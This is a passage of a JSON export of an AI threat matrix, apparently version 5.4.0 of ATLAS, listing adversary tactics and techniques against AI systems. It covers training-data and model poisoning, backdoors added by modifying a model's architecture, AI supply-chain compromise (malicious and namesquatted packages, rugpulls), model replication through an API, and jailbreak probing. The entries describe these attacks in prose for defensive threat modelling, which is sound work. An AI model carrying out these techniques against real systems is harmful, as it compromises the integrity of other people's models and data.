{
  "version": "5.4.0",
  "name": "Adversarial Threat Landscape for AI Systems",
  "tactics": [
    {
      "id": "AML.TA0002",
      "name": "Reconnaissance",
      "description": "The adversary is trying to gather information about the AI system they can use to plan future operations.\n\nReconnaissance consists of techniques that involve adversaries actively or passively gathering information that can be used to support targeting.\nSuch information may include details of the victim organizations' AI capabilities and research efforts.\nThis information can be leveraged by the adversary to aid in other phases of the adversary lifecycle, such as using gathered information to obtain relevant AI artifacts, targeting AI capabilities used by the victim, tailoring attacks to the particular models used by the victim, or to drive and lead further Reconnaissance efforts.",
      "type": "tactic"
    },
    {
      "id": "AML.TA0003",
      "name": "Resource Development",
      "description": "The adversary is trying to establish resources they can use to support operations.\n\nResource Development consists of techniques that involve adversaries creating,\npurchasing, or compromising/stealing resources that can be used to support targeting.\nSuch resources include AI artifacts, infrastructure, accounts, or capabilities.\nThese resources can be leveraged by the adversary to aid in other phases of the adversary lifecycle, such as [AI Attack Staging](/tactics/AML.TA0001).",
      "type": "tactic"
    },
    {
      "id": "AML.TA0004",
      "name": "Initial Access",
      "description": "The adversary is trying to gain access to the AI system.\n\nThe target system could be a network, mobile device, or an edge device such as a sensor platform.\nThe AI capabilities used by the system could be local with onboard or cloud-enabled AI capabilities.\n\nInitial Access consists of techniques that use various entry vectors to gain their initial foothold within the system.",
      "type": "tactic"
    },
    {
      "id": "AML.TA0000",
      "name": "AI Model Access",
      "description": "The adversary is attempting to gain some level of access to an AI model.\n\nAI Model Access enables techniques that use various types of access to the AI model that can be used by the adversary to gain information, develop attacks, and as a means to input data to the model.\nThe level of access can range from the full knowledge of the internals of the model to access to the physical environment where data is collected for use in the AI model.\nThe adversary may use varying levels of model access during the course of their attack, from staging the attack to impacting the target system.\n\nAccess to an AI model may require access to the system housing the model, the model may be publicly accessible via an API, or it may be accessed indirectly via interaction with a product or service that utilizes AI as part of its processes.",
      "type": "tactic"
    },
    {
      "id": "AML.TA0005",
      "name": "Execution",
      "description": "The adversary is trying to run malicious code embedded in AI artifacts or software.\n\nExecution consists of techniques that result in adversary-controlled code running on a local or remote system.\nTechniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data.\nFor example, an adversary might use a remote access tool to run a PowerShell script that does [Remote System Discovery](https://attack.mitre.org/techniques/T1018/).",
      "type": "tactic"
    },
    {
      "id": "AML.TA0006",
      "name": "Persistence",
      "description": "The adversary is trying to maintain their foothold via AI artifacts or software.\n\nPersistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access.\nTechniques used for persistence often involve leaving behind modified ML artifacts such as poisoned training data or manipulated AI models.",
      "type": "tactic"
    },
    {
      "id": "AML.TA0012",
      "name": "Privilege Escalation",
      "description": "The adversary is trying to gain higher-level permissions.\n\nPrivilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include:\n- SYSTEM/root level\n- local administrator\n- user account with admin-like access\n- user accounts with access to specific system or perform specific function\n\nThese techniques often overlap with Persistence techniques, as OS features that let an adversary persist can execute in an elevated context.\n",
      "type": "tactic"
    },
    {
      "id": "AML.TA0007",
      "name": "Defense Evasion",
      "description": "The adversary is trying to avoid being detected by AI-enabled security software.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise.\nTechniques used for defense evasion include evading AI-enabled security software such as malware detectors.",
      "type": "tactic"
    },
    {
      "id": "AML.TA0013",
      "name": "Credential Access",
      "description": "The adversary is trying to steal account names and passwords.\n\nCredential Access consists of techniques for stealing credentials like account names and passwords. Techniques used to get credentials include keylogging or credential dumping. Using legitimate credentials can give adversaries access to systems, make them harder to detect, and provide the opportunity to create more accounts to help achieve their goals.\n",
      "type": "tactic"
    },
    {
      "id": "AML.TA0008",
      "name": "Discovery",
      "description": "The adversary is trying to figure out your AI environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network.\nThese techniques help adversaries observe the environment and orient themselves before deciding how to act.\nThey also allow adversaries to explore what they can control and what's around their entry point in order to discover how it could benefit their current objective.\nNative operating system tools are often used toward this post-compromise information-gathering objective.",
      "type": "tactic"
    },
    {
      "id": "AML.TA0015",
      "name": "Lateral Movement",
      "description": "The adversary is trying to move through your AI environment.\n\nLateral Movement consists of techniques that adversaries may use to gain access to and control other systems or components in the environment. Adversaries may pivot towards AI Ops infrastructure such as model registries, experiment trackers, vector databases, notebooks, or training pipelines. As the adversary moves through the environment, they may discover means of accessing additional AI-related tools, services, or applications. AI agents may also be a valuable target as they commonly have more permissions than standard user accounts on the system.",
      "type": "tactic"
    },
    {
      "id": "AML.TA0009",
      "name": "Collection",
      "description": "The adversary is trying to gather AI artifacts and other related information relevant to their goal.\n\nCollection consists of techniques adversaries may use to gather information and the sources information is collected from that are relevant to following through on the adversary's objectives.\nFrequently, the next goal after collecting data is to steal (exfiltrate) the AI artifacts, or use the collected information to stage future operations.\nCommon target sources include software repositories, container registries, model repositories, and object stores.",
      "type": "tactic"
    },
    {
      "id": "AML.TA0001",
      "name": "AI Attack Staging",
      "description": "The adversary is leveraging their knowledge of and access to the target system to tailor the attack.\n\nAI Attack Staging consists of techniques adversaries use to prepare their attack on the target AI model.\nTechniques can include training proxy models, poisoning the target model, and crafting adversarial data to feed the target model.\nSome of these techniques can be performed in an offline manner and are thus difficult to mitigate.\nThese techniques are often used to achieve the adversary's end goal.",
      "type": "tactic"
    },
    {
      "id": "AML.TA0014",
      "name": "Command and Control",
      "description": "The adversary is trying to communicate with compromised AI systems to control them.\n\nCommand and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim's network structure and defenses.",
      "type": "tactic"
    },
    {
      "id": "AML.TA0010",
      "name": "Exfiltration",
      "description": "The adversary is trying to steal AI artifacts or other information about the AI system.\n\nExfiltration consists of techniques that adversaries may use to steal data from your network.\nData may be stolen for its valuable intellectual property, or for use in staging future operations.\n\nTechniques for getting data out of a target network typically include transferring it over their command and control channel or an alternate channel and may also include putting size limits on the transmission.",
      "type": "tactic"
    },
    {
      "id": "AML.TA0011",
      "name": "Impact",
      "description": "The adversary is trying to manipulate, interrupt, erode confidence in, or destroy your AI systems and data.\n\nImpact consists of techniques that adversaries use to disrupt availability or compromise integrity by manipulating business and operational processes.\nTechniques used for impact can include destroying or tampering with data.\nIn some cases, business processes can look fine, but may have been altered to benefit the adversaries' goals.\nThese techniques might be used by adversaries to follow through on their end goal or to provide cover for a confidentiality breach.",
      "type": "tactic"
    }
  ],
  "techniques": [
    {
      "id": "AML.T0000",
      "name": "Search Open Technical Databases",
      "description": "Adversaries may search for publicly available research and technical documentation to learn how and where AI is used within a victim organization.\nThe adversary can use this information to identify targets for attack, or to tailor an existing attack to make it more effective.\nOrganizations often use open source model architectures trained on additional proprietary data in production.\nKnowledge of this underlying architecture allows the adversary to craft more realistic proxy models ([Create Proxy AI Model](/techniques/AML.T0005)).\nAn adversary can search these resources for publications for authors employed at the victim organization.\n\nResearch and technical materials may exist as academic papers published in [Journals and Conference Proceedings](/techniques/AML.T0000.000), or stored in [Pre-Print Repositories](/techniques/AML.T0000.001), as well as [Technical Blogs](/techniques/AML.T0000.002).",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0000.000",
      "name": "Journals and Conference Proceedings",
      "description": "Many of the publications accepted at premier artificial intelligence conferences and journals come from commercial labs.\nSome journals and conferences are open access, others may require paying for access or a membership.\nThese publications will often describe in detail all aspects of a particular approach for reproducibility.\nThis information can be used by adversaries to implement the paper.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0000.001",
      "name": "Pre-Print Repositories",
      "description": "Pre-Print repositories, such as arXiv, contain the latest academic research papers that haven't been peer reviewed.\nThey may contain research notes, or technical reports that aren't typically published in journals or conference proceedings.\nPre-print repositories also serve as a central location to share papers that have been accepted to journals.\nSearching pre-print repositories  provide adversaries with a relatively up-to-date view of what researchers in the victim organization are working on.\n",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0000.002",
      "name": "Technical Blogs",
      "description": "Research labs at academic institutions and company R&D divisions often have blogs that highlight their use of artificial intelligence and its application to the organization's unique problems.\nIndividual researchers also frequently document their work in blogposts.\nAn adversary may search for posts made by the target victim organization or its employees.\nIn comparison to [Journals and Conference Proceedings](/techniques/AML.T0000.000) and [Pre-Print Repositories](/techniques/AML.T0000.001) this material will often contain more practical aspects of the AI system.\nThis could include underlying technologies and frameworks used, and possibly some information about the API access and use case.\nThis will help the adversary better understand how that organization is using AI internally and the details of their approach that could aid in tailoring an attack.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0001",
      "name": "Search Open AI Vulnerability Analysis",
      "description": "Much like the [Search Open Technical Databases](/techniques/AML.T0000), there is often ample research available on the vulnerabilities of common AI models. Once a target has been identified, an adversary will likely try to identify any pre-existing work that has been done for this class of models.\nThis will include not only reading academic papers that may identify the particulars of a successful attack, but also identifying pre-existing implementations of those attacks. The adversary may obtain [Adversarial AI Attack Implementations](/techniques/AML.T0016.000) or develop their own [Adversarial AI Attacks](/techniques/AML.T0017.000) if necessary.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0003",
      "name": "Search Victim-Owned Websites",
      "description": "Adversaries may search websites owned by the victim for information that can be used during targeting.\nVictim-owned websites may contain technical details about their AI-enabled products or services.\nVictim-owned websites may contain a variety of details, including names of departments/divisions, physical locations, and data about key employees such as names, roles, and contact info.\nThese sites may also have details highlighting business operations and relationships.\n\nAdversaries may search victim-owned websites to gather actionable information.\nThis information may help adversaries tailor their attacks (e.g. [Adversarial AI Attacks](/techniques/AML.T0017.000) or [Manual Modification](/techniques/AML.T0043.003)).\nInformation from these sources may reveal opportunities for other forms of reconnaissance (e.g. [Search Open Technical Databases](/techniques/AML.T0000) or [Search Open AI Vulnerability Analysis](/techniques/AML.T0001))",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0004",
      "name": "Search Application Repositories",
      "description": "Adversaries may search open application repositories during targeting.\nExamples of these include Google Play, the iOS App store, the macOS App Store, and the Microsoft Store.\n\nAdversaries may craft search queries seeking applications that contain AI-enabled components.\nFrequently, the next step is to [Acquire Public AI Artifacts](/techniques/AML.T0002).",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0006",
      "name": "Active Scanning",
      "description": "An adversary may probe or scan the victim system to gather information for targeting. This is distinct from other reconnaissance techniques that do not involve direct interaction with the victim system.\n\nAdversaries may scan for open ports on a potential victim's network, which can indicate specific services or tools the victim is utilizing. This could include a scan for tools related to AI DevOps or AI services themselves such as public AI chat agents (ex: [Copilot Studio Hunter](https://github.com/mbrg/power-pwn/wiki/Modules:-Copilot-Studio-Hunter-%E2%80%90-Enum)). They can also send emails to organization service addresses and inspect the replies for indicators that an AI agent is managing the inbox.\n\nInformation gained from Active Scanning may yield targets that provide opportunities for other forms of reconnaissance such as [Search Open Technical Databases](/techniques/AML.T0000), [Search Open AI Vulnerability Analysis](/techniques/AML.T0001), or [Gather RAG-Indexed Targets](/techniques/AML.T0064).",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0002",
      "name": "Acquire Public AI Artifacts",
      "description": "Adversaries may search public sources, including cloud storage, public-facing services, and software or data repositories, to identify AI artifacts.\nThese AI artifacts may include the software stack used to train and deploy models, training and testing data, model configurations and parameters.\nAn adversary will be particularly interested in artifacts hosted by or associated with the victim organization as they may represent what that organization uses in a production environment.\nAdversaries may identify artifact repositories via other resources associated with the victim organization (e.g. [Search Victim-Owned Websites](/techniques/AML.T0003) or [Search Open Technical Databases](/techniques/AML.T0000)).\nThese AI artifacts often provide adversaries with details of the AI task and approach.\n\nAI artifacts can aid in an adversary's ability to [Create Proxy AI Model](/techniques/AML.T0005).\nIf these artifacts include pieces of the actual model in production, they can be used to directly [Craft Adversarial Data](/techniques/AML.T0043).\nAcquiring some artifacts requires registration (providing user details such email/name), AWS keys, or written requests, and may require the adversary to [Establish Accounts](/techniques/AML.T0021).\n\nArtifacts might be hosted on victim-controlled infrastructure, providing the victim with some information on who has accessed that data.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0002.000",
      "name": "Datasets",
      "description": "Adversaries may collect public datasets to use in their operations.\nDatasets used by the victim organization or datasets that are representative of the data used by the victim organization may be valuable to adversaries.\nDatasets can be stored in cloud storage, or on victim-owned websites.\nSome datasets require the adversary to [Establish Accounts](/techniques/AML.T0021) for access.\n\nAcquired datasets help the adversary advance their operations, stage attacks,  and tailor attacks to the victim organization.\n",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0002.001",
      "name": "Models",
      "description": "Adversaries may acquire public models to use in their operations.\nAdversaries may seek models used by the victim organization or models that are representative of those used by the victim organization.\nRepresentative models may include model architectures, or pre-trained models which define the architecture as well as model parameters from training on a dataset.\nThe adversary may search public sources for common model architecture configuration file formats such as YAML or Python configuration files, and common model storage file formats such as ONNX (.onnx), HDF5 (.h5), Pickle (.pkl), PyTorch (.pth), or TensorFlow (.pb, .tflite).\n\nAcquired models are useful in advancing the adversary's operations and are frequently used to tailor attacks to the victim model.\n",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0016",
      "name": "Obtain Capabilities",
      "description": "Adversaries may search for and obtain software capabilities for use in their operations.\nCapabilities may be specific to AI-based attacks [Adversarial AI Attack Implementations](/techniques/AML.T0016.000) or generic software tools repurposed for malicious intent ([Software Tools](/techniques/AML.T0016.001)). In both instances, an adversary may modify or customize the capability to aid in targeting a particular AI-enabled system.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0016.000",
      "name": "Adversarial AI Attack Implementations",
      "description": "Adversaries may search for existing open source implementations of AI attacks. The research community often publishes their code for reproducibility and to further future research. Libraries intended for research purposes, such as CleverHans, the Adversarial Robustness Toolbox, and FoolBox, can be weaponized by an adversary. Adversaries may also obtain and use tools that were not originally designed for adversarial AI attacks as part of their attack.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0016.001",
      "name": "Software Tools",
      "description": "Adversaries may search for and obtain software tools to support their operations.\nSoftware designed for legitimate use may be repurposed by an adversary for malicious intent.\nAn adversary may modify or customize software tools to achieve their purpose.\nSoftware tools used to support attacks on AI systems are not necessarily AI-based themselves.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0017",
      "name": "Develop Capabilities",
      "description": "Adversaries may develop their own capabilities to support operations. This process encompasses identifying requirements, building solutions, and deploying capabilities. Capabilities used to support attacks on AI-enabled systems are not necessarily AI-based themselves. Examples include setting up websites with adversarial information or creating Jupyter notebooks with obfuscated exfiltration code.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0017.000",
      "name": "Adversarial AI Attacks",
      "description": "Adversaries may develop their own adversarial attacks.\nThey may leverage existing libraries as a starting point ([Adversarial AI Attack Implementations](/techniques/AML.T0016.000)).\nThey may implement ideas described in public research papers or develop custom made attacks for the victim model.\n",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0008",
      "name": "Acquire Infrastructure",
      "description": "Adversaries may buy, lease, or rent infrastructure for use throughout their operation.\nA wide variety of infrastructure exists for hosting and orchestrating adversary operations.\nInfrastructure solutions include physical or cloud servers, domains, mobile devices, and third-party web services.\nFree resources may also be used, but they are typically limited.\nInfrastructure can also include physical components such as countermeasures that degrade or disrupt AI components or sensors, including printed materials, wearables, or disguises.\n\nUse of these infrastructure solutions allows an adversary to stage, launch, and execute an operation.\nSolutions may help adversary operations blend in with traffic that is seen as normal, such as contact to third-party web services.\nDepending on the implementation, adversaries may use infrastructure that makes it difficult to physically tie back to them as well as utilize infrastructure that can be rapidly provisioned, modified, and shut down.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0008.000",
      "name": "AI Development Workspaces",
      "description": "Developing and staging AI attacks often requires expensive compute resources.\nAdversaries may need access to one or many GPUs in order to develop an attack.\nThey may try to anonymously use free resources such as Google Colaboratory, or cloud resources such as AWS, Azure, or Google Cloud as an efficient way to stand up temporary resources to conduct operations.\nMultiple workspaces may be used to avoid detection.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0008.001",
      "name": "Consumer Hardware",
      "description": "Adversaries may acquire consumer hardware to conduct their attacks.\nOwning the hardware provides the adversary with complete control of the environment. These devices can be hard to trace.\n",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0019",
      "name": "Publish Poisoned Datasets",
      "description": "Adversaries may [Poison Training Data](/techniques/AML.T0020) and publish it to a public location.\nThe poisoned dataset may be a novel dataset or a poisoned variant of an existing open source dataset.\nThis data may be introduced to a victim system via [AI Supply Chain Compromise](/techniques/AML.T0010).\n",
      "tactic": "",
      "type": "technique",
      "severity": "high"
    },
    {
      "id": "AML.T0010",
      "name": "AI Supply Chain Compromise",
      "description": "Adversaries may gain initial access to a system by compromising the unique portions of the AI supply chain.\nThis could include [Hardware](/techniques/AML.T0010.000), [Data](/techniques/AML.T0010.002) and its annotations, parts of the AI [AI Software](/techniques/AML.T0010.001) stack, or the [Model](/techniques/AML.T0010.003) itself.\nIn some instances the attacker will need secondary access to fully carry out an attack using compromised components of the supply chain.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0010.000",
      "name": "Hardware",
      "description": "Adversaries may target AI systems by disrupting or manipulating the hardware supply chain. AI models often run on specialized hardware such as GPUs, TPUs, or embedded devices, but may also be optimized to operate on CPUs.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0010.001",
      "name": "AI Software",
      "description": "Adversaries may target software packages that are commonly used in AI-enabled systems or are part of the AI DevOps lifecycle. This can include deep learning frameworks used to build AI models (e.g. PyTorch, TensorFlow, Jax), generative AI integration frameworks (e.g. LangChain, LangFlow), inference engines, AI DevOps tools, and Model Context Protocol servers, which give AI agents access to tools and data resources. They may also target the dependency chains of any of these software packages [\\[1\\]][1]. Additionally, adversaries may target specific components used by AI software such as configuration files [\\[2\\]][2] or example usage of AI tools, which may be distributed in Jupyter notebooks [\\[3\\]][3].\n\nAdversaries may compromise legitimate packages [\\[4\\]][4] or publish malicious software to a namesquatted location [\\[1\\]][1]. They may target package names that are hallucinated by large language models [\\[5\\]][5] (see: Publish Hallucinated Entities). They may also perform a \"rugpull\" in which they first publish a legitimate package and then publish a malicious version once they reach a critical mass of users [\\[6\\]][6].\n\n[1]: https://pytorch.org/blog/compromised-nightly-dependency/ \"Compromised PyTorch-nightly dependency chain between December 25th and December 30th, 2022.\"\n[2]: https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents \"New Vulnerability in GitHub Copilot and Cursor: How Hackers Can Weaponize Code Agents\"\n[3]: https://medium.com/mlearning-ai/careful-who-you-colab-with-fa8001f933e7 \"Careful Who You Colab With: abusing google colaboratory\"\n[4]: https://aws.amazon.com/security/security-bulletins/AWS-2025-015/ \"Security Update for Amazon Q Developer Extension for Visual Studio Code (Version #1.84)\"\n[5]: https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/slopsquatting-when-ai-agents-hallucinate-malicious-packages \"Slopsquatting: When AI Agents Hallucinate Malicious Packages\"\n[6]: https://www.koi.ai/blog/postmark-mcp-npm-malicious-backdoor-email-theft \"First Malicious MCP in the Wild: The Postmark Backdoor That's Stealing Your Emails\"",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0010.002",
      "name": "Data",
      "description": "Data is a key vector of supply chain compromise for adversaries.\nEvery AI project will require some form of data.\nMany rely on large open source datasets that are publicly available.\nAn adversary could rely on compromising these sources of data.\nThe malicious data could be a result of [Poison Training Data](/techniques/AML.T0020) or include traditional malware.\n\nAn adversary can also target private datasets in the labeling phase.\nThe creation of private datasets will often require the hiring of outside labeling services.\nAn adversary can poison a dataset by modifying the labels being generated by the labeling service.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0010.003",
      "name": "Model",
      "description": "AI-enabled systems often rely on open sourced models in various ways.\nMost commonly, the victim organization may be using these models for fine tuning.\nThese models will be downloaded from an external source and then used as the base for the model as it is tuned on a smaller, private dataset.\nLoading models often requires executing some saved code in the form of a saved model file.\nThese can be compromised with traditional malware, or through some adversarial AI techniques.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0040",
      "name": "AI Model Inference API Access",
      "description": "Adversaries may gain access to a model via legitimate access to the inference API.\nInference API access can be a source of information to the adversary ([Discover AI Model Ontology](/techniques/AML.T0013), [Discover AI Model Family](/techniques/AML.T0014)), a means of staging the attack ([Verify Attack](/techniques/AML.T0042), [Craft Adversarial Data](/techniques/AML.T0043)), or for introducing data to the target system for Impact ([Evade AI Model](/techniques/AML.T0015), [Erode AI Model Integrity](/techniques/AML.T0031)).\n\nMany systems rely on the same models provided via an inference API, which means they share the same vulnerabilities. This is especially true of foundation models which are prohibitively resource intensive to train. Adversaries may use their access to model APIs to identify vulnerabilities such as jailbreaks or hallucinations and then target applications that use the same models.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0047",
      "name": "AI-Enabled Product or Service",
      "description": "Adversaries may use a product or service that uses artificial intelligence under the hood to gain access to the underlying AI model.\nThis type of indirect model access may reveal details of the AI model or its inferences in logs or metadata.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0041",
      "name": "Physical Environment Access",
      "description": "In addition to the attacks that take place purely in the digital domain, adversaries may also exploit the physical environment for their attacks.\nIf the model is interacting with data collected from the real world in some way, the adversary can influence the model through access to wherever the data is being collected.\nBy modifying the data in the collection process, the adversary can perform modified versions of attacks designed for digital access.\n",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0044",
      "name": "Full AI Model Access",
      "description": "Adversaries may gain full \"white-box\" access to an AI model.\nThis means the adversary has complete knowledge of the model architecture, its parameters, and class ontology.\nThey may exfiltrate the model to [Craft Adversarial Data](/techniques/AML.T0043) and [Verify Attack](/techniques/AML.T0042) in an offline where it is hard to detect their behavior.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0013",
      "name": "Discover AI Model Ontology",
      "description": "Adversaries may discover the ontology of an AI model's output space, for example, the types of objects a model can detect.\nThe adversary may discovery the ontology by repeated queries to the model, forcing it to enumerate its output space.\nOr the ontology may be discovered in a configuration file or in documentation about the model.\n\nThe model ontology helps the adversary understand how the model is being used by the victim.\nIt is useful to the adversary in creating targeted attacks.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0014",
      "name": "Discover AI Model Family",
      "description": "Adversaries may discover the general family of model.\nGeneral information about the model may be revealed in documentation, or the adversary may use carefully constructed examples and analyze the model's responses to categorize it.\n\nKnowledge of the model family can help the adversary identify means of attacking the model and help tailor the attack.\n",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0020",
      "name": "Poison Training Data",
      "description": "Adversaries may attempt to poison datasets used by an AI model by modifying the underlying data or its labels.\nThis allows the adversary to embed vulnerabilities in AI models trained on the data that may not be easily detectable.\nData poisoning attacks may or may not require modifying the labels.\nThe embedded vulnerability is activated at a later time by data samples with an [Insert Backdoor Trigger](/techniques/AML.T0043.004)\n\nPoisoned data can be introduced via [AI Supply Chain Compromise](/techniques/AML.T0010) or the data may be poisoned after the adversary gains [Initial Access](/tactics/AML.TA0004) to the system.",
      "tactic": "",
      "type": "technique",
      "severity": "high"
    },
    {
      "id": "AML.T0021",
      "name": "Establish Accounts",
      "description": "Adversaries may create accounts with various services for use in targeting, to gain access to resources needed in [AI Attack Staging](/tactics/AML.TA0001), or for victim impersonation.\n",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0005",
      "name": "Create Proxy AI Model",
      "description": "Adversaries may obtain models to serve as proxies for the target model in use at the victim organization.\nProxy models are used to simulate complete access to the target model in a fully offline manner.\n\nAdversaries may train models from representative datasets, attempt to replicate models from victim inference APIs, or use available pre-trained models.\n",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0005.000",
      "name": "Train Proxy via Gathered AI Artifacts",
      "description": "Proxy models may be trained from AI artifacts (such as data, model architectures, and pre-trained models) that are representative of the target model gathered by the adversary.\nThis can be used to develop attacks that require higher levels of access than the adversary has available or as a means to validate pre-existing attacks without interacting with the target model.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0005.001",
      "name": "Train Proxy via Replication",
      "description": "Adversaries may replicate a private model.\nBy repeatedly querying the victim's [AI Model Inference API Access](/techniques/AML.T0040), the adversary can collect the target model's inferences into a dataset.\nThe inferences are used as labels for training a separate model offline that will mimic the behavior and performance of the target model.\n\nA replicated model that closely mimic's the target model is a valuable resource in staging the attack.\nThe adversary can use the replicated model to [Craft Adversarial Data](/techniques/AML.T0043) for various purposes (e.g. [Evade AI Model](/techniques/AML.T0015), [Spamming AI System with Chaff Data](/techniques/AML.T0046)).\n",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0005.002",
      "name": "Use Pre-Trained Model",
      "description": "Adversaries may use an off-the-shelf pre-trained model as a proxy for the victim model to aid in staging the attack.\n",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0007",
      "name": "Discover AI Artifacts",
      "description": "Adversaries may search private sources to identify AI learning artifacts that exist on the system and gather information about them.\nThese artifacts can include the software stack used to train and deploy models, training and testing data management systems, container registries, software repositories, and model zoos.\n\nThis information can be used to identify targets for further collection, exfiltration, or disruption, and to tailor and improve attacks.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0011",
      "name": "User Execution",
      "description": "An adversary may rely upon specific actions by a user in order to gain execution.\nUsers may inadvertently execute unsafe code introduced via [AI Supply Chain Compromise](/techniques/AML.T0010).\nUsers may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link.\n",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0011.000",
      "name": "Unsafe AI Artifacts",
      "description": "Adversaries may develop unsafe AI artifacts that when executed have a deleterious effect.\nThe adversary can use this technique to establish persistent access to systems.\nThese models may be introduced via a [AI Supply Chain Compromise](/techniques/AML.T0010).\n\nSerialization of models is a popular technique for model storage, transfer, and loading.\nHowever, this format without proper checking presents an opportunity for code execution.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0012",
      "name": "Valid Accounts",
      "description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access.\nCredentials may take the form of usernames and passwords of individual user accounts or API keys that provide access to various AI resources and services.\n\nCompromised credentials may provide access to additional AI artifacts and allow the adversary to perform [Discover AI Artifacts](/techniques/AML.T0007).\nCompromised credentials may also grant an adversary increased privileges such as write access to AI artifacts used during development or production.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0015",
      "name": "Evade AI Model",
      "description": "Adversaries can [Craft Adversarial Data](/techniques/AML.T0043) that prevents an AI model from correctly identifying the contents of the data or [Generate Deepfakes](/techniques/AML.T0088) that fools an AI model expecting authentic data.\n\nThis technique can be used to evade a downstream task where AI is utilized. The adversary may evade AI-based virus/malware detection or network scanning towards the goal of a traditional cyber attack. AI model evasion through deepfake generation may also provide initial access to systems that use AI-based biometric authentication.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0018",
      "name": "Manipulate AI Model",
      "description": "Adversaries may directly manipulate an AI model to change its behavior or introduce malicious code. Manipulating a model gives the adversary a persistent change in the system. This can include poisoning the model by changing its weights, modifying the model architecture to change its behavior, and embedding malware which may be executed when the model is loaded.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0018.000",
      "name": "Poison AI Model",
      "description": "Adversaries may manipulate an AI model's weights to change it's behavior or performance, resulting in a poisoned model.\nAdversaries may poison a model by directly manipulating its weights, training the model on poisoned data, further fine-tuning the model, or otherwise interfering with its training process. \n\nThe change in behavior of poisoned models may be limited to targeted categories in predictive AI models, or targeted topics, concepts, or facts in generative AI models, or aim for a general performance degradation.",
      "tactic": "",
      "type": "technique",
      "severity": "high"
    },
    {
      "id": "AML.T0018.001",
      "name": "Modify AI Model Architecture",
      "description": "Adversaries may directly modify an AI model's architecture to re-define it's behavior. This can include adding or removing layers as well as adding pre or post-processing operations.\n\nThe effects could include removing the ability to predict certain classes, adding erroneous operations to increase computation costs, or degrading performance. Additionally, a separate adversary-defined network could be injected into the computation graph, which can change the behavior based on the inputs, effectively creating a backdoor.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0024",
      "name": "Exfiltration via AI Inference API",
